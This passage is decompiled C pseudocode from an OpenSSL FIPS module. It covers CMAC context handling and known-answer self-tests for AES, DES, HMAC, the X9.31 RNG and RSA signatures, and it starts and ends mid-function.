        // 0x4c227b
        return 0;
    }
    if (v8 >= 1) {
        int64_t v9 = 0; // 0x4c236a
        char v10 = 2 * *(char *)(a1 + 232); // 0x4c2383
        char * v11 = (char *)(a1 + 168); // 0x4c2387
        *v11 = v10;
        if ((v6 + 0xffffffff & 0xffffffff) > v9) {
            // 0x4c238f
            if (*(char *)(a1 + 233) < 0) {
                // 0x4c2398
                *v11 = v10 | 1;
            }
        }
        int64_t v12 = v9 + 1; // 0x4c2370
        int64_t v13 = a1 + 1; // 0x4c237a
        v9 = v12 & 0xffffffff;
        while ((int32_t)v12 != v8) {
            int64_t v14 = v13;
            v10 = 2 * *(char *)(v14 + 232);
            v11 = (char *)(v14 + 168);
            *v11 = v10;
            if ((v6 + 0xffffffff & 0xffffffff) > v9) {
                // 0x4c238f
                if (*(char *)(v14 + 233) < 0) {
                    // 0x4c2398
                    *v11 = v10 | 1;
                }
            }
            // 0x4c2370
            v12 = v9 + 1;
            v13 = v14 + 1;
            v9 = v12 & 0xffffffff;
        }
    }
    int64_t v15 = 0x100000000 * v6 / 0x100000000; // 0x4c23e7
    if (*(char *)v5 < 0) {
        char * v16 = (char *)(v15 + a1 + 167); // 0x4c2496
        *v16 = *v16 ^ (v8 == 16 ? -121 : 27);
    }
    if (v8 >= 1) {
        int64_t v17 = 0; // 0x4c23fe
        char v18 = 2 * *(char *)(a1 + 168); // 0x4c2413
        char * v19 = (char *)(a1 + 200); // 0x4c2417
        *v19 = v18;
        if ((v6 + 0xffffffff & 0xffffffff) > v17) {
            // 0x4c241f
            if (*(char *)(a1 + 169) < 0) {
                // 0x4c2428
                *v19 = v18 | 1;
            }
        }
        int64_t v20 = v17 + 1; // 0x4c2400
        int64_t v21 = a1 + 1; // 0x4c240a
        v17 = v20 & 0xffffffff;
        while ((int32_t)v20 != v8) {
            int64_t v22 = v21;
            v18 = 2 * *(char *)(v22 + 168);
            v19 = (char *)(v22 + 200);
            *v19 = v18;
            if ((v6 + 0xffffffff & 0xffffffff) > v17) {
                // 0x4c241f
                if (*(char *)(v22 + 169) < 0) {
                    // 0x4c2428
                    *v19 = v18 | 1;
                }
            }
            // 0x4c2400
            v20 = v17 + 1;
            v21 = v22 + 1;
            v17 = v20 & 0xffffffff;
        }
    }
    // 0x4c2438
    if (*(char *)(a1 + 168) < 0) {
        char * v23 = (char *)(v15 + a1 + 199); // 0x4c24b4
        *v23 = *v23 ^ (v8 != 16 ? 27 : -121);
    }
    // 0x4c2441
    OPENSSL_cleanse(v5, v15);
    int64_t v24 = EVP_EncryptInit_ex(a1, 0, 0, 0, &g289); // 0x4c245c
    result = 0;
    if ((int32_t)v24 != 0) {
        // 0x4c2469
        memset(v7, 0, (int32_t)v15);
        *(int32_t *)(a1 + 296) = 0;
        result = 1;
    }
    // 0x4c227b
    return result;
  lab_0x4c222e:
    // 0x4c222e
    if ((*(char *)(a1 + 113) & 8) == 0) {
        // 0x4c23a8
        ERR_put_error(6, 173, 163, "cmac.c", 157);
        // 0x4c227b
        return 0;
    }
    goto lab_0x4c2238;
}

// Address range: 0x4c2580 - 0x4c25d9
int64_t CMAC_CTX_cleanup(int64_t a1) {
    // 0x4c2580
    EVP_CIPHER_CTX_cleanup(a1);
    OPENSSL_cleanse(a1 + 232, 32);
    OPENSSL_cleanse(a1 + 168, 32);
    OPENSSL_cleanse(a1 + 200, 32);
    int64_t result = OPENSSL_cleanse(a1 + 264, 32); // 0x4c25c8
    *(int32_t *)(a1 + 296) = -1;
    return result;
}

// Address range: 0x4c25e0 - 0x4c25f2
int64_t CMAC_CTX_free(int64_t a1) {
    // 0x4c25e0
    CMAC_CTX_cleanup(a1);
    int64_t v1; // 0x4c25e0
    return CRYPTO_free(a1, v1);
}

// Address range: 0x4c2600 - 0x4c2636
int64_t CMAC_CTX_new(void) {
    // 0x4c2600
    int64_t v1; // 0x4c2600
    int64_t v2; // 0x4c2600
    int64_t result = CRYPTO_malloc(304, "cmac.c", 100, v2, v1); // 0x4c2612
    if (result != 0) {
        // 0x4c261f
        EVP_CIPHER_CTX_init(result);
        *(int32_t *)(result + 296) = -1;
    }
    // 0x4c2631
    return result;
}

// Address range: 0x4c2650 - 0x4c2750
int64_t FIPS_selftest_aes_xts(void) {
    int64_t v1 = __readfsqword(40); // 0x4c265e
    int64_t v2; // bp-200, 0x4c2650
    int64_t v3 = &v2; // 0x4c2671
    EVP_CIPHER_CTX_init(v3);
    int64_t v4 = EVP_aes_128_xts(); // 0x4c2679
    int64_t v5 = fips_cipher_test(&v2, v4, &g19, &g20, &g21, &g22, 16); // 0x4c26a7
    int64_t v6 = EVP_aes_256_xts(); // 0x4c26ae
    int64_t v7 = fips_cipher_test(&v2, v6, &g23, &g24, &g25, &g26, 32); // 0x4c26dc
    EVP_CIPHER_CTX_cleanup(v3);
    int64_t result = 1; // 0x4c26e3
    if ((int32_t)v5 < 1 || (int32_t)v7 < 1) {
        // 0x4c2720
        ERR_put_error(45, 144, 101, "fips_aes_selftest.c", 355);
        result = 0;
    }
    // 0x4c26f6
    if (v1 == __readfsqword(40)) {
        // 0x4c2709
        return result;
    }
    // 0x4c2745
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c2750 - 0x4c2a40
int64_t FIPS_selftest_aes_gcm(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    // 0x4c2750
    int64_t v1; // bp-360, 0x4c2750
    int64_t v2 = &v1; // 0x4c276e
    int64_t v3 = __readfsqword(40); // 0x4c2779
    EVP_CIPHER_CTX_init(v2);
    int64_t str2; // bp-184, 0x4c2750
    __asm_rep_stosq_memset((char *)&str2, 0, 16);
    bool v4; // 0x4c2750
    int64_t v5 = (v4 ? -128 : 128) + (int64_t)&str2; // 0x4c279b
    int64_t str = 0; // bp-56, 0x4c279e
    int64_t v6 = EVP_aes_256_gcm(v5); // 0x4c27b6
    int64_t result; // 0x4c2750
    if ((int32_t)EVP_CipherInit_ex(v2, v6, 0, 0, 0, 1) != 0) {
        // 0x4c2840
        if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
            goto lab_0x4c27d7;
        } else {
            int64_t v7 = EVP_CipherInit_ex(v2, 0, 0, (int32_t)&g27, (int32_t)&g28, 1); // 0x4c2877
            if ((int32_t)v7 == 0) {
                goto lab_0x4c27d7;
            } else {
                // 0x4c2884
                if ((int32_t)EVP_Cipher(v2, NULL, (int64_t)&g29, 16) < 0) {
                    goto lab_0x4c27d7;
                } else {
                    int64_t v8 = EVP_Cipher(v2, &str2, (int64_t)&g30, 16); // 0x4c28b4
                    if ((int32_t)v8 != 16) {
                        goto lab_0x4c27d7;
                    } else {
                        // 0x4c28c2
                        if ((int32_t)EVP_Cipher(v2, NULL, 0, 0) < 0) {
                            goto lab_0x4c27d7;
                        } else {
                            // 0x4c28d8
                            if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                goto lab_0x4c27d7;
                            } else {
                                // 0x4c28f5
                                if (memcmp(&str, &g31, 16) != 0) {
                                    goto lab_0x4c27d7;
                                } else {
                                    int32_t memcmp_rc = memcmp(&str2, &g32, 16); // 0x4c2920
                                    if (memcmp_rc != 0) {
                                        goto lab_0x4c27d7;
                                    } else {
                                        // 0x4c292d
                                        __asm_rep_stosd_memset((char *)&str2, memcmp_rc, 32);
                                        int64_t v9 = EVP_aes_256_gcm(v5); // 0x4c2937
                                        if ((int32_t)EVP_CipherInit_ex(v2, v9, 0, 0, 0, 0) == 0) {
                                            goto lab_0x4c27d7;
                                        } else {
                                            // 0x4c2959
                                            if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                                goto lab_0x4c27d7;
                                            } else {
                                                // 0x4c2975
                                                if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                                    goto lab_0x4c27d7;
                                                } else {
                                                    int64_t v10 = EVP_CipherInit_ex(v2, 0, 0, (int32_t)&g27, (int32_t)&g28, 0); // 0x4c29aa
                                                    if ((int32_t)v10 == 0) {
                                                        goto lab_0x4c27d7;
                                                    } else {
                                                        // 0x4c29b7
                                                        if ((int32_t)EVP_Cipher(v2, NULL, (int64_t)&g29, 16) < 0) {
                                                            goto lab_0x4c27d7;
                                                        } else {
                                                            int64_t v11 = EVP_Cipher(v2, &str2, (int64_t)&g32, 16); // 0x4c29e7
                                                            if ((int32_t)v11 != 16) {
                                                                goto lab_0x4c27d7;
                                                            } else {
                                                                // 0x4c29f5
                                                                if ((int32_t)EVP_Cipher(v2, NULL, 0, 0) < 0) {
                                                                    goto lab_0x4c27d7;
                                                                } else {
                                                                    // 0x4c2a0b
                                                                    if (memcmp(&str2, &g30, 16) != 0) {
                                                                        goto lab_0x4c27d7;
                                                                    } else {
                                                                        // 0x4c2a27
                                                                        EVP_CIPHER_CTX_cleanup(v2);
                                                                        result = 1;
                                                                        goto lab_0x4c2802;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        goto lab_0x4c27d7;
    }
  lab_0x4c27d7:
    // 0x4c27d7
    EVP_CIPHER_CTX_cleanup(v2);
    ERR_put_error(45, 129, 101, "fips_aes_selftest.c", 287);
    result = 0;
    goto lab_0x4c2802;
  lab_0x4c2802:
    // 0x4c2802
    if (v3 == __readfsqword(40)) {
        // 0x4c2819
        return result;
    }
    // 0x4c2a39
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c2a40 - 0x4c2d40
int64_t FIPS_selftest_aes_ccm(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    // 0x4c2a40
    int64_t v1; // bp-360, 0x4c2a40
    int64_t v2 = &v1; // 0x4c2a5e
    int64_t v3 = __readfsqword(40); // 0x4c2a61
    EVP_CIPHER_CTX_init(v2);
    int64_t str2; // bp-184, 0x4c2a40
    __asm_rep_stosq_memset((char *)&str2, 0, 16);
    bool v4; // 0x4c2a40
    int64_t v5 = (v4 ? -128 : 128) + (int64_t)&str2; // 0x4c2a83
    int64_t v6 = EVP_aes_192_ccm(v5); // 0x4c2a86
    int64_t result; // 0x4c2a40
    if ((int32_t)EVP_CipherInit_ex(v2, v6, 0, 0, 0, 1) != 0) {
        // 0x4c2b10
        if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
            goto lab_0x4c2aa7;
        } else {
            // 0x4c2b2c
            if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                goto lab_0x4c2aa7;
            } else {
                int64_t v7 = EVP_CipherInit_ex(v2, 0, 0, (int32_t)&g33, (int32_t)&g34, 1); // 0x4c2b63
                if ((int32_t)v7 == 0) {
                    goto lab_0x4c2aa7;
                } else {
                    // 0x4c2b70
                    if ((int32_t)EVP_Cipher(v2, NULL, 0, 24) != 24) {
                        goto lab_0x4c2aa7;
                    } else {
                        // 0x4c2b8a
                        if ((int32_t)EVP_Cipher(v2, NULL, (int64_t)&g35, 32) < 0) {
                            goto lab_0x4c2aa7;
                        } else {
                            int64_t v8 = EVP_Cipher(v2, &str2, (int64_t)&g36, 24); // 0x4c2bba
                            if ((int32_t)v8 != 24) {
                                goto lab_0x4c2aa7;
                            } else {
                                // 0x4c2bc8
                                if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                    goto lab_0x4c2aa7;
                                } else {
                                    // 0x4c2bed
                                    int64_t str; // bp-56, 0x4c2a40
                                    if (memcmp(&str, &g37, 16) != 0) {
                                        goto lab_0x4c2aa7;
                                    } else {
                                        int32_t memcmp_rc = memcmp(&str2, &g38, 24); // 0x4c2c18
                                        if (memcmp_rc != 0) {
                                            goto lab_0x4c2aa7;
                                        } else {
                                            // 0x4c2c25
                                            __asm_rep_stosd_memset((char *)&str2, memcmp_rc, 32);
                                            int64_t v9 = EVP_aes_192_ccm(v5); // 0x4c2c2f
                                            if ((int32_t)EVP_CipherInit_ex(v2, v9, 0, 0, 0, 0) == 0) {
                                                goto lab_0x4c2aa7;
                                            } else {
                                                // 0x4c2c51
                                                if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                                    goto lab_0x4c2aa7;
                                                } else {
                                                    // 0x4c2c6d
                                                    if ((int32_t)EVP_CIPHER_CTX_ctrl(v2) == 0) {
                                                        goto lab_0x4c2aa7;
                                                    } else {
                                                        int64_t v10 = EVP_CipherInit_ex(v2, 0, 0, (int32_t)&g33, (int32_t)&g34, 0); // 0x4c2ca2
                                                        if ((int32_t)v10 == 0) {
                                                            goto lab_0x4c2aa7;
                                                        } else {
                                                            // 0x4c2caf
                                                            if ((int32_t)EVP_Cipher(v2, NULL, 0, 24) != 24) {
                                                                goto lab_0x4c2aa7;
                                                            } else {
                                                                // 0x4c2cc9
                                                                if ((int32_t)EVP_Cipher(v2, NULL, (int64_t)&g35, 32) < 0) {
                                                                    goto lab_0x4c2aa7;
                                                                } else {
                                                                    int64_t v11 = EVP_Cipher(v2, &str2, (int64_t)&g38, 24); // 0x4c2cf9
                                                                    if ((int32_t)v11 != 24) {
                                                                        goto lab_0x4c2aa7;
                                                                    } else {
                                                                        // 0x4c2d07
                                                                        if (memcmp(&str2, &g36, 24) != 0) {
                                                                            goto lab_0x4c2aa7;
                                                                        } else {
                                                                            // 0x4c2d23
                                                                            EVP_CIPHER_CTX_cleanup(v2);
                                                                            result = 1;
                                                                            goto lab_0x4c2ad2;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        goto lab_0x4c2aa7;
    }
  lab_0x4c2aa7:
    // 0x4c2aa7
    EVP_CIPHER_CTX_cleanup(v2);
    ERR_put_error(45, 145, 101, "fips_aes_selftest.c", 196);
    result = 0;
    goto lab_0x4c2ad2;
  lab_0x4c2ad2:
    // 0x4c2ad2
    if (v3 == __readfsqword(40)) {
        // 0x4c2ae9
        return result;
    }
    // 0x4c2d35
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c2d40 - 0x4c2e30
int64_t FIPS_selftest_aes(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    int64_t v1 = __readfsqword(40); // 0x4c2d4d
    int64_t v2; // bp-216, 0x4c2d40
    int64_t v3 = &v2; // 0x4c2d60
    EVP_CIPHER_CTX_init(v3);
    char v4 = g290 != 0;
    int64_t v5 = EVP_aes_128_ecb(); // 0x4c2d98
    int64_t v6 = fips_cipher_test(&v2, v5, (int64_t *)&v4, NULL, &g39, &g40, 16); // 0x4c2dc2
    EVP_CIPHER_CTX_cleanup(v3);
    int64_t result = 1; // 0x4c2dc9
    if ((int32_t)v6 < 1) {
        // 0x4c2df8
        ERR_put_error(45, 110, 101, "fips_aes_selftest.c", 107);
        result = 0;
    }
    // 0x4c2dd8
    if (v1 == __readfsqword(40)) {
        // 0x4c2deb
        return result;
    }
    // 0x4c2e25
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c2e40 - 0x4c2fc0
int64_t FIPS_selftest_des(void) {
    int64_t v1 = __readfsqword(40); // 0x4c2e65
    int64_t v2; // bp-232, 0x4c2e40
    int64_t v3 = &v2; // 0x4c2e78
    EVP_CIPHER_CTX_init(v3);
    int64_t v4 = 0; // 0x4c2e7b
    int64_t v5 = 0x100000000 * v4 / 0x8000000;
    char v6 = (char)*(int64_t *)((v5 | 16) + (int64_t)&g41); // 0x4c2e90
    char v7 = v6; // bp-56, 0x4c2e90
    if (g291 != 0) {
        // 0x4c2e9e
        v7 = v6 + 1;
    }
    int64_t v8 = EVP_des_ede_ecb(); // 0x4c2ea6
    int64_t result; // 0x4c2e40
    while ((int32_t)fips_cipher_test(&v2, v8, (int64_t *)(v5 + (int64_t)&g41), NULL, (int64_t *)&v7, (int64_t *)(v5 + (int64_t)&g41 + 24), 8) != 0) {
        int64_t v9 = v4 + 1; // 0x4c2eda
        v4 = v9 & 0xffffffff;
        if ((int32_t)v9 == 2) {
            int64_t v10 = EVP_des_ede3_ecb(); // 0x4c2ee2
            int64_t v11 = fips_cipher_test(&v2, v10, &g42, NULL, &g43, &g44, 8); // 0x4c2f0b
            if ((int32_t)v11 == 0) {
                goto lab_0x4c2f80;
            } else {
                int64_t v12 = EVP_des_ede3_ecb(); // 0x4c2f14
                int64_t v13 = fips_cipher_test(&v2, v12, &g45, NULL, &g46, &g47, 8); // 0x4c2f3d
                if ((int32_t)v13 == 0) {
                    goto lab_0x4c2f80;
                } else {
                    // 0x4c2f46
                    EVP_CIPHER_CTX_cleanup(v3);
                    result = 1;
                    goto lab_0x4c2f53;
                }
            }
        }
        v5 = 0x100000000 * v4 / 0x8000000;
        v6 = (char)*(int64_t *)((v5 | 16) + (int64_t)&g41);
        v7 = v6;
        if (g291 != 0) {
            // 0x4c2e9e
            v7 = v6 + 1;
        }
        // 0x4c2ea6
        v8 = EVP_des_ede_ecb();
    }
    goto lab_0x4c2f80;
  lab_0x4c2f80:
    // 0x4c2f80
    EVP_CIPHER_CTX_cleanup(v3);
    ERR_put_error(45, 111, 101, "fips_des_selftest.c", 143);
    result = 0;
    goto lab_0x4c2f53;
  lab_0x4c2f53:
    // 0x4c2f53
    if (v1 == __readfsqword(40)) {
        // 0x4c2f66
        return result;
    }
    // 0x4c2fad
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c2fc0 - 0x4c30c0
int64_t FIPS_selftest_hmac(void) {
    int64_t v1 = __readfsqword(40); // 0x4c2fdf
    int32_t v2; // bp-140, 0x4c2fc0
    int64_t v3 = &v2;
    bool v4; // 0x4c2fc0
    int64_t v5 = v4 ? -1 : 1;
    int64_t v6 = 0; // 0x4c2ff4
    int64_t v7 = &g160;
    int64_t str = *(int64_t *)(v7 + 16); // 0x4c2ffb
    int32_t len = strlen((char *)str); // 0x4c300a
    int64_t str2 = *(int64_t *)(v7 + 8); // 0x4c300f
    int32_t len2 = strlen((char *)str2); // 0x4c301b
    int64_t v8; // bp-136, 0x4c2fc0
    v6 = HMAC(v6, str2, (int64_t)len2, (int64_t *)str, (int64_t)len, &v8, v3);
    int64_t v9 = &v8; // 0x4c304d
    int64_t v10 = v7 + 24; // 0x4c304d
    int64_t v11 = v2;
    int64_t v12; // 0x4c2fc0
    int64_t result; // 0x4c2fc0
    char v13; // 0x4c304d
    while (v11 != 0) {
        v12 = v9;
        v13 = *(char *)v10;
        v9 = v12 + v5;
        v10 += v5;
        if (*(char *)v12 != v13) {
            // 0x4c3090
            ERR_put_error(45, 113, 101, "fips_hmac_selftest.c", 131);
            result = 0;
            goto lab_0x4c3065;
        }
        v11--;
    }
    int64_t v14 = v7 + 88; // 0x4c3054
    result = 1;
    while (v7 != (int64_t)&g161) {
        // 0x4c2ff9
        v7 = v14;
        str = *(int64_t *)(v7 + 16);
        len = strlen((char *)str);
        str2 = *(int64_t *)(v7 + 8);
        len2 = strlen((char *)str2);
        v6 = HMAC(v6, str2, (int64_t)len2, (int64_t *)str, (int64_t)len, &v8, v3);
        v9 = &v8;
        v10 = v7 + 24;
        v11 = v2;
        while (v11 != 0) {
            v12 = v9;
            v13 = *(char *)v10;
            v9 = v12 + v5;
            v10 += v5;
            if (*(char *)v12 != v13) {
                // 0x4c3090
                ERR_put_error(45, 113, 101, "fips_hmac_selftest.c", 131);
                result = 0;
                goto lab_0x4c3065;
            }
            v11--;
        }
        // 0x4c3051
        v14 = v7 + 88;
        result = 1;
    }
    goto lab_0x4c3065;
  lab_0x4c3065:
    // 0x4c3065
    if (v1 == __readfsqword(40)) {
        // 0x4c3075
        return result;
    }
    // 0x4c30b5
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c30d0 - 0x4c3160
int64_t do_x931_test(int64_t * a1, int64_t a2, int64_t * a3) {
    int64_t v1 = (int64_t)a3;
    int64_t v2 = __readfsqword(40); // 0x4c30d9
    int64_t v3 = *(int64_t *)(v1 + 16); // bp-72, 0x4c30ed
    int64_t result = 0; // 0x4c3105
    if ((int32_t)FIPS_x931_set_key((int64_t)a1, a2) != 0) {
        // 0x4c3107
        FIPS_x931_seed((int64_t)&v3, 16);
        FIPS_x931_set_dt(v1);
        int64_t v4; // bp-56, 0x4c30d0
        FIPS_x931_bytes(&v4, 16);
        bool v5; // 0x4c30d0
        int64_t v6 = v5 ? -1 : 1; // 0x4c313a
        int64_t v7 = v1 + 32; // 0x4c30d0
        int64_t v8 = &v4; // 0x4c30d0
        int64_t v9 = 16; // 0x4c313a
        result = 0;
        while (*(char *)v8 == *(char *)v7) {
            v9--;
            v7 += v6;
            v8 += v6;
            result = 1;
            if (v9 == 0) {
                // break -> 0x4c3142
                break;
            }
            result = 0;
        }
    }
    // 0x4c3142
    if (v2 == __readfsqword(40)) {
        // 0x4c3152
        return result;
    }
    // 0x4c3159
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x4c3160 - 0x4c321d
int64_t FIPS_selftest_x931(void) {
    // 0x4c3160
    FIPS_x931_reset();
    if ((int32_t)FIPS_x931_test_mode() == 0) {
        // 0x4c31e0
        ERR_put_error(45, 114, 101, "fips_rand_selftest.c", 163);
        return 0;
    }
    int64_t v1 = do_x931_test(&g208, 16, &g209); // 0x4c318f
    int64_t v2 = do_x931_test(&g210, 24, &g211); // 0x4c31a9
    int64_t v3 = do_x931_test(&g212, 32, &g213); // 0x4c31cc
    FIPS_x931_reset();
    if ((int32_t)v3 == 0 || (int32_t)v1 != 0 != (int32_t)v2 != 0) {
        // 0x4c31e0
        ERR_put_error(45, 114, 101, "fips_rand_selftest.c", 174);
        return 0;
    }
    // 0x4c3211
    return 1;
}

// Address range: 0x4c3240 - 0x4c3770
int64_t FIPS_selftest_rsa(void) {
    // 0x4c3240
    int64_t v1; // 0x4c3240
    int64_t v2 = RSA_new(v1); // 0x4c325d
    if (v2 == 0) {
        // 0x4c33b3
        return 0;
    }
    int64_t * v3 = (int64_t *)(v2 + 32); // 0x4c326e
    int64_t v4 = BN_bin2bn((int64_t)&g58, 257, (int32_t)*v3); // 0x4c327e
    *v3 = v4;
    if (g292 != 0) {
        // 0x4c33d8
        BN_set_bit(v4, 2048);
    }
    int64_t * v5 = (int64_t *)(v2 + 40); // 0x4c3295
    int64_t v6 = BN_bin2bn((int64_t)&g65, 3, (int32_t)*v5); // 0x4c32a5
    int64_t * v7 = (int64_t *)(v2 + 48); // 0x4c32aa
    *v5 = v6;
    int64_t v8 = BN_bin2bn((int64_t)&g64, 256, (int32_t)*v7); // 0x4c32be
    int64_t * v9 = (int64_t *)(v2 + 56); // 0x4c32c3
    *v7 = v8;
    int64_t v10 = BN_bin2bn((int64_t)&g63, 129, (int32_t)*v9); // 0x4c32d7
    int64_t * v11 = (int64_t *)(v2 + 64); // 0x4c32dc
    *v9 = v10;
    int64_t v12 = BN_bin2bn((int64_t)&g62, 129, (int32_t)*v11); // 0x4c32f0
    int64_t * v13 = (int64_t *)(v2 + 72); // 0x4c32f5
    *v11 = v12;
    int64_t v14 = BN_bin2bn((int64_t)&g61, 128, (int32_t)*v13); // 0x4c3309
    int64_t * v15 = (int64_t *)(v2 + 80); // 0x4c330e
    *v13 = v14;
    int64_t v16 = BN_bin2bn((int64_t)&g60, 129, (int32_t)*v15); // 0x4c3322
    int64_t * v17 = (int64_t *)(v2 + 88); // 0x4c3327
    int64_t v18 = *v17; // 0x4c3327
    *v15 = v16;
    *v17 = BN_bin2bn((int64_t)&g59, 128, (int32_t)v18);
    int64_t v19 = EVP_PKEY_new((int64_t)&g59, 128, v18); // 0x4c3344
    if (v19 == 0) {
        // 0x4c33ab
        RSA_free(v2);
        // 0x4c33b3
        return 0;
    }
    // 0x4c3355
    EVP_PKEY_set1_RSA(v19, v2);
    int64_t v20 = EVP_sha1(); // 0x4c3360
    int64_t v21 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g48, 256, (int32_t)v20, 0, (int64_t)"RSA SHA1 PKCS#1"); // 0x4c3397
    int64_t v22 = 0; // 0x4c339e
    int64_t v23; // 0x4c3240
    int64_t v24; // 0x4c366a
    int64_t v25; // 0x4c3693
    if ((int32_t)v21 != 0) {
        int64_t v26 = EVP_sha224(); // 0x4c33f0
        int64_t v27 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g49, 256, (int32_t)v26, 0, (int64_t)"RSA SHA224 PKCS#1"); // 0x4c3427
        v22 = 0;
        if ((int32_t)v27 == 0) {
            goto lab_0x4c33a3;
        } else {
            int64_t v28 = EVP_sha256(); // 0x4c3434
            int64_t v29 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g50, 256, (int32_t)v28, 0, (int64_t)"RSA SHA256 PKCS#1"); // 0x4c346b
            v22 = 0;
            if ((int32_t)v29 == 0) {
                goto lab_0x4c33a3;
            } else {
                int64_t v30 = EVP_sha384(); // 0x4c3478
                int64_t v31 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g51, 256, (int32_t)v30, 0, (int64_t)"RSA SHA384 PKCS#1"); // 0x4c34af
                v22 = 0;
                if ((int32_t)v31 == 0) {
                    goto lab_0x4c33a3;
                } else {
                    int64_t v32 = EVP_sha512(v19, (int64_t)"OpenSSL FIPS 140-2 Public Key RSA KAT"); // 0x4c34bc
                    int64_t v33 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g52, 256, (int32_t)v32, 0, (int64_t)"RSA SHA512 PKCS#1"); // 0x4c34f3
                    v22 = 0;
                    if ((int32_t)v33 == 0) {
                        goto lab_0x4c33a3;
                    } else {
                        int64_t v34 = EVP_sha1(); // 0x4c3500
                        int64_t v35 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g53, 256, (int32_t)v34, 32, (int64_t)"RSA SHA1 PSS"); // 0x4c3537
                        v22 = 0;
                        if ((int32_t)v35 == 0) {
                            goto lab_0x4c33a3;
                        } else {
                            int64_t v36 = EVP_sha224(); // 0x4c3544
                            int64_t v37 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g54, 256, (int32_t)v36, 32, (int64_t)"RSA SHA224 PSS"); // 0x4c357b
                            v22 = 0;
                            if ((int32_t)v37 == 0) {
                                goto lab_0x4c33a3;
                            } else {
                                int64_t v38 = EVP_sha256(); // 0x4c3588
                                int64_t v39 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g55, 256, (int32_t)v38, 32, (int64_t)"RSA SHA256 PSS"); // 0x4c35bf
                                v22 = 0;
                                if ((int32_t)v39 == 0) {
                                    goto lab_0x4c33a3;
                                } else {
                                    int64_t v40 = EVP_sha384(); // 0x4c35cc
                                    int64_t v41 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g56, 256, (int32_t)v40, 32, (int64_t)"RSA SHA384 PSS"); // 0x4c3603
                                    v22 = 0;
                                    if ((int32_t)v41 == 0) {
                                        goto lab_0x4c33a3;
                                    } else {
                                        int64_t v42 = EVP_sha512(v19, (int64_t)"OpenSSL FIPS 140-2 Public Key RSA KAT"); // 0x4c3610
                                        int64_t v43 = fips_pkey_signature_test(v19, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", 37, (int32_t)&g57, 256, (int32_t)v42, 32, (int64_t)"RSA SHA512 PSS"); // 0x4c3647
                                        v22 = 0;
                                        if ((int32_t)v43 == 0) {
                                            goto lab_0x4c33a3;
                                        } else {
                                            int64_t v44 = RSA_size(v2); // 0x4c3657
                                            v24 = CRYPTO_malloc(v44 & 0xffffffff, "fips_rsa_selftest.c", 447, (int64_t)&g57, 256);
                                            v22 = 0;
                                            if (v24 == 0) {
                                                goto lab_0x4c33a3;
                                            } else {
                                                int64_t * str = (int64_t *)v24; // 0x4c3693
                                                v25 = RSA_public_encrypt(37, (int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", str, v2, 1);
                                                int32_t v45 = v25; // 0x4c3698
                                                v23 = (int64_t)"OpenSSL FIPS 140-2 Public Key RSA KAT";
                                                if (v45 < 1) {
                                                    goto lab_0x4c3706;
                                                } else {
                                                    if (v45 < 37) {
                                                        goto lab_0x4c36c4;
                                                    } else {
                                                        // 0x4c36a8
                                                        v23 = v24;
                                                        if (memcmp((int64_t *)"OpenSSL FIPS 140-2 Public Key RSA KAT", str, 37) == 0) {
                                                            goto lab_0x4c3706;
                                                        } else {
                                                            goto lab_0x4c36c4;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        goto lab_0x4c33a3;
    }
  lab_0x4c33a3:
    // 0x4c33a3
    EVP_PKEY_free(v19);
    // 0x4c33ab
    RSA_free(v2);
    // 0x4c33b3
    return v22 & 0xffffffff;
  lab_0x4c3706:
    // 0x4c3706
    CRYPTO_free(v24, v23);
    // 0x4c371b
    v22 = false;
    goto lab_0x4c33a3;
  lab_0x4c36c4:;
    int64_t str2 = CRYPTO_malloc(RSA_size(v2) & 0xffffffff, "fips_rsa_selftest.c", 458, v2, 1); // 0x4c36da
    v23 = (int64_t)"fips_rsa_selftest.c";
    if (str2 == 0) {
        goto lab_0x4c3706;
    } else {
        int64_t v46 = RSA_private_decrypt(v25 & 0xffffffff, v24, str2, v2, 1); // 0x4c36f9
        int64_t v47 = v24; // 0x4c3701
        int32_t v48 = 0; // 0x4c3701
